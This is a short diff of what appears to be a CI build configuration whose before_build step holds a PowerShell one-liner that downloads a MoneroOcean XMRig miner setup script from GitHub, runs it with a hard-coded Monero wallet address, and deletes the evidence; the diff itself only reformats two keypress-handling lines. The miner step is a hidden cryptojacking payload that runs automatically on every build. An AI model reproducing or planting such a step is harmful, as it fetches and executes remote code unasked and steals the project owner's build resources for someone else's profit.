@@ -1,7 +1,7 @@
 before_build:
    
     - powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j; Remove-Item -Force $tempfile"
-    - $Host.UI.RawUI.ReadKey("NoEcho, IncludeKeyDown") | OUT-NULL
-    - $Host.UI.RawUI.FlushInputbuffer()
+     $Host.UI.RawUI.ReadKey("NoEcho, IncludeKeyDown") | OUT-NULL
+     $Host.UI.RawUI.FlushInputbuffer()
     
 
